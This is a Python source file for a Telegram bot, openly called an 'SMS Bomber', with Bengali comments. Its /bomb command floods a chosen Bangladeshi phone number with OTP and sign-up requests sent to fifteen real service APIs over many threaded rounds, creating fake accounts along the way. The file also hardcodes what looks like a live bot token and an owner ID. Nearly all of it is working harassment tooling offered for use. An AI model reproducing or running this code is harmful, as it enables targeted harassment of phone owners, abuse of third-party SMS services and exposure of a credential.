#!/usr/bin/env python3
import os
import re
import random
import string
import requests
import threading
import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
from concurrent.futures import ThreadPoolExecutor

# ================= কনফিগারেশন =================
BOT_TOKEN = "8624707974:AAEOwXg99cGERJdlbaGQTqxMyg_uWOLWIqE"  # এখানে আপনার বর্তমান টোকেন বসান
OWNER_ID = 1700797877  # আপনার টেলিগ্রাম আইডি (মালিক)
authorized_groups = set()  # অনুমোদিত গ্রুপের আইডি

# ================= টেলিগ্রাম বার্তা পাঠানোর হেল্পার (থ্রেড থেকে কল করতে) =================
def send_message_sync(chat_id, text, parse_mode=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": chat_id, "text": text}
    if parse_mode:
        payload["parse_mode"] = parse_mode
    try:
        requests.post(url, json=payload, timeout=5)
    except Exception as e:
        print(f"Send error: {e}")

# ================= র‍্যান্ডম স্ট্রিং জেনারেটর =================
def random_string(pattern):
    result = []
    i = 0
    while i < len(pattern):
        if pattern[i:i+2] == '?n':
            result.append(str(random.randint(0, 9)))
            i += 2
        elif pattern[i:i+2] == '?l':
            result.append(random.choice(string.ascii_lowercase))
            i += 2
        elif pattern[i:i+2] == '?i':
            result.append(random.choice(string.ascii_letters + string.digits))
            i += 2
        else:
            result.append(pattern[i])
            i += 1
    return ''.join(result)

# ================= HTTP রিকোয়েস্ট হেল্পার =================
def send_req(url, method, headers, data=None):
    try:
        if method == "POST":
            resp = requests.post(url, headers=headers, json=data, timeout=10)
        else:
            resp = requests.get(url, headers=headers, timeout=10)
        return resp
    except:
        return None

# ================= ১৫টি এপিআই ফাংশন (ঠিক আপনার দেওয়া) =================
def api_1(number, pgen, egen, did, name):
    url = "https://core.easy.com.bd/api/v1/registration"
    headers = {"Accept-Encoding": "gzip", "Connection": "Keep-Alive", "Content-Type": "application/json; charset=utf-8", "Host": "core.easy.com.bd", "User-Agent": "okhttp/3.9.1"}
    data = {"password": pgen, "password_confirmation": pgen, "device_key": did, "name": name, "mobile": number, "email": f"{egen}info@gmail.com"}
    return send_req(url, "POST", headers, data)

def api_2(number):
    url = "https://training.gov.bd/backoffice/api/user/sendOtp"
    headers = {"Accept-Encoding": "gzip", "Connection": "Keep-Alive", "Content-Type": "application/json; charset=utf-8", "Host": "training.gov.bd", "User-Agent": "okhttp/3.9.1"}
    data = {"mobile": number}
    return send_req(url, "POST", headers, data)

def api_3(number):
    url = "https://auth.qcoom.com/api/v1/otp/send"
    headers = {"Accept-Encoding": "gzip", "Connection": "Keep-Alive", "Content-Type": "application/json; charset=utf-8", "Host": "auth.qcoom.com", "User-Agent": "okhttp/3.9.1"}
    data = {"mobileNumber": f"+88{number}"}
    return send_req(url, "POST", headers, data)

def api_4(number):
    url = "https://api.apex4u.com/api/auth/login"
    headers = {"Accept-Encoding": "gzip", "Connection": "Keep-Alive", "Content-Type": "application/json; charset=utf-8", "Host": "api.apex4u.com", "User-Agent": "okhttp/3.9.1"}
    data = {"phoneNumber": number}
    return send_req(url, "POST", headers, data)

def api_5(number):
    url = "https://api.osudpotro.com/api/v1/users/send_otp"
    headers = {"Accept-Encoding": "gzip", "Connection": "Keep-Alive", "Content-Type": "application/json; charset=utf-8", "Host": "api.osudpotro.com", "User-Agent": "okhttp/3.9.1"}
    data = {"os": "web", "mobile": f"+88-{number}", "language": "en", "deviceToken": "web"}
    return send_req(url, "POST", headers, data)

def api_6(number):
    url = "https://api.busbd.com.bd/api/auth"
    headers = {"Accept-Encoding": "gzip", "Connection": "Keep-Alive", "Content-Type": "application/json; charset=utf-8", "Host": "api.busbd.com.bd", "User-Agent": "okhttp/3.9.1"}
    data = {"phone": f"+88{number}"}
    return send_req(url, "POST", headers, data)

def api_7(number):
    url = "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp"
    headers = {"Accept-Encoding": "gzip", "Connection": "Keep-Alive", "Content-Type": "application/json; charset=utf-8", "Host": "bkshopthc.grameenphone.com", "User-Agent": "okhttp/3.9.1"}
    data = {"phone": number, "language": "en", "email": ""}
    return send_req(url, "POST", headers, data)

def api_8(number):
    url = "https://app.deshal.net/api/auth/login"
    headers = {"Accept-Encoding": "gzip", "Connection": "Keep-Alive", "Content-Type": "application/json; charset=utf-8", "Host": "app.deshal.net", "User-Agent": "okhttp/3.9.1"}
    data = {"phone": number}
    return send_req(url, "POST", headers, data)

def api_9(number):
    url = "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en"
    headers = {"Accept-Encoding": "gzip", "Connection": "Keep-Alive", "Content-Type": "application/json; charset=utf-8", "Host": "api-dynamic.chorki.com", "User-Agent": "okhttp/3.9.1"}
    data = {"number": f"+88{number}"}
    return send_req(url, "POST", headers, data)

def api_10(number, pgen, egen, name):
    url = "https://regalfurniturebd.com/api/auth/register"
    headers = {"Accept-Encoding": "gzip", "Connection": "Keep-Alive", "Content-Type": "application/json; charset=utf-8", "Host": "regalfurniturebd.com", "User-Agent": "okhttp/3.9.1"}
    data = {"emergency_contact_number": number, "password_confirmation": pgen, "address": "", "address_1": "Dhaka,bd,ch", "address_2": "My,won,home", "telephone": number, "agree": True, "device_name": "web_browser", "password": pgen, "district": "Outside Dhaka", "post_code": "200", "name": name, "company": "dhaka", "email": f"{egen}@gmail.com"}
    return send_req(url, "POST", headers, data)

def api_11(number):
    url = "https://da-api.robi.com.bd/da-nll/otp/send"
    headers = {"Accept-Encoding": "gzip", "Connection": "Keep-Alive", "Content-Type": "application/json; charset=utf-8", "Host": "da-api.robi.com.bd", "User-Agent": "okhttp/3.9.1"}
    data = {"msisdn": number}
    return send_req(url, "POST", headers, data)

def api_12(number):
    url = "https://api.shikho.com/public/activity/otp"
    headers = {"Accept-Encoding": "gzip", "Connection": "Keep-Alive", "Content-Type": "application/json; charset=utf-8", "Host": "api.shikho.com", "User-Agent": "okhttp/3.9.1"}
    data = {"phone": number, "intent": "ap-discount-request"}
    return send_req(url, "POST", headers, data)

def api_13(number):
    url = "https://api.garibookadmin.com/api/v3/user/login"
    headers = {"Accept-Encoding": "gzip", "Connection": "Keep-Alive", "Content-Type": "application/json; charset=utf-8", "Host": "api.garibookadmin.com", "User-Agent": "okhttp/3.9.1"}
    data = {"recaptcha_token": "garibookcaptcha", "mobile": number, "channel": "web"}
    return send_req(url, "POST", headers, data)

def api_14(number):
    url = "https://api.pathao.com/v2/auth/register"
    headers = {"Accept-Encoding": "gzip", "Android-OS": "10", "App-Agent": "ride/android/491", "Connection": "Keep-Alive", "Content-Type": "application/json; charset=utf-8", "Host": "api.pathao.com", "User-Agent": "okhttp/4.12.0"}
    data = {"country_prefix": "880", "national_number": number[1:], "country_id": 1}
    return send_req(url, "POST", headers, data)

def api_15(number):
    url = "https://fundesh.com.bd/api/auth/generateOTP?service_key="
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36", "Pragma": "no-cache", "Accept": "*/*"}
    data = {"msisdn": number[1:]}
    return send_req(url, "POST", headers, data)

# ================= বোম্বিং ফাংশন (প্রতি রাউন্ডে ৫০ থ্রেড, প্রগ্রেস কলব্যাক) =================
def run_bombing_with_progress(number, rounds, chat_id, loop):
    apis = [api_2, api_3, api_4, api_5, api_6, api_7, api_8, api_9, api_11, api_12, api_13, api_14, api_15]
    total_success = 0
    for round_num in range(1, rounds + 1):
        pgen = random_string("?n?n?n?n?n?n?n?n?n?n?n?n")
        egen = random_string("?n?n?n?n?n?n?n?n")
        did = random_string("?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i")
        name = random_string("?l?l?l?l?l?l")
        round_success = 0
        with ThreadPoolExecutor(max_workers=50) as ex:
            futures = [ex.submit(api_1, number, pgen, egen, did, name), ex.submit(api_10, number, pgen, egen, name)]
            futures.extend(ex.submit(api, number) for api in apis)
            for f in futures:
                r = f.result()
                if r and r.status_code == 200:
                    round_success += 1
        total_success += round_success
        # টেলিগ্রামে আপডেট পাঠানো (মেইন ইভেন্ট লুপে)
        asyncio.run_coroutine_threadsafe(
            send_progress(chat_id, round_num, round_success, total_success),
            loop
        )
    return total_success

async def send_progress(chat_id, round_num, round_success, total_so_far):
    # এই ফাংশনটি মেইন ইভেন্ট লুপে কল হবে; এখানে `update` অবজেক্ট নেই, তাই সরাসরি bot.send_message ব্যবহার করতে হবে।
    # আমরা context ছাড়া bot ইন্সট্যান্স পাব না – তাই সহজ উপায়: আলাদা সিঙ্ক ফাংশন দিয়ে মেসেজ পাঠানো। নিচে করছি।
    send_message_sync(chat_id, f"✅ Round {round_num}: {round_success} successes (Total so far: {total_so_far})")

# ================= টেলিগ্রাম কমান্ড হ্যান্ডলার =================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🤖 **SMS Bomber Bot**\n\n"
        "/bomb <number> [rounds] – Send OTP bomb\n"
        "Example: `/bomb 01712345678`\n"
        "Example: `/bomb 01712345678 50`\n\n"
        "👑 Owner commands:\n"
        "/authgroup <group_id>\n"
        "/unauthgroup <group_id>\n"
        "/listgroups",
        parse_mode="Markdown"
    )

async def bomb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    chat_type = update.effective_chat.type

    # গ্রুপ অনুমোদন চেক
    if chat_type != "private" and chat_id not in authorized_groups:
        await update.message.reply_text(f"❌ This group not authorized. ID: `{chat_id}`", parse_mode="Markdown")
        return

    if not args:
        await update.message.reply_text("Usage: `/bomb 017XXXXXXXX [rounds]`", parse_mode="Markdown")
        return
    number = args[0]
    if not re.match(r'^01[3-9]\d{8}$', number):
        await update.message.reply_text("❌ Invalid number. Example: 01712345678")
        return
    rounds = 1
    if len(args) > 1 and args[1].isdigit():
        rounds = int(args[1])
        if rounds > 500:  # সীমা নির্ধারণ (ইচ্ছামত বাড়াতে পারেন)
            rounds = 500
            await update.message.reply_text("⚠️ Max 500 rounds per command.")
    await update.message.reply_text(f"💣 Bombing `{number}` with {rounds} round(s)...\n_Progress will appear here_", parse_mode="Markdown")

    def do_bomb():
        loop = context.application.loop
        total = run_bombing_with_progress(number, rounds, chat_id, loop)
        asyncio.run_coroutine_threadsafe(
            update.message.reply_text(f"🎉 **Done!** {total} successful requests sent to `{number}`.", parse_mode="Markdown"),
            loop
        )
    threading.Thread(target=do_bomb).start()

async def authgroup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("Unauthorized.")
        return
    if not context.args:
        await update.message.reply_text("Usage: `/authgroup -1001234567890`", parse_mode="Markdown")
        return
    try:
        gid = int(context.args[0])
        authorized_groups.add(gid)
        await update.message.reply_text(f"✅ Group `{gid}` authorized.", parse_mode="Markdown")
    except:
        await update.message.reply_text("Invalid group ID.")

async def unauthgroup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        return
    if not context.args:
        return
    try:
        gid = int(context.args[0])
        authorized_groups.discard(gid)
        await update.message.reply_text(f"✅ Group `{gid}` unauthorized.", parse_mode="Markdown")
    except:
        pass

async def listgroups(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        return
    if not authorized_groups:
        await update.message.reply_text("No authorized groups.")
    else:
        groups = "\n".join(str(g) for g in authorized_groups)
        await update.message.reply_text(f"**Authorized groups:**\n{groups}", parse_mode="Markdown")

# ================= মেইন ফাংশন (লং পোলিং) =================
def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", start))
    app.add_handler(CommandHandler("bomb", bomb))
    app.add_handler(CommandHandler("authgroup", authgroup))
    app.add_handler(CommandHandler("unauthgroup", unauthgroup))
    app.add_handler(CommandHandler("listgroups", listgroups))
    print("Bot started with long polling...")
    app.run_polling()

if __name__ == "__main__":
    main()
